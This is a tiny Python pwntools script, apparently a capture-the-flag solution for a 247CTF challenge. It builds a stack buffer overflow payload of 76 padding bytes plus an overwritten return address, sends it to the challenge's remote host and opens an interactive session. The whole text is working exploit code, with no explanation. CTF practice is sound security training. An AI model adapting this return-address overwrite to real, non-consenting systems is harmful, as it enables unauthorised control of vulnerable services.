from pwn import *


payload = b"\41" * 76 + p32(0x8048576)

p = remote("751374cbfb60b1ae.247ctf.com", 50103)

print(p.recv())

p.sendline(payload)

p.interactive()
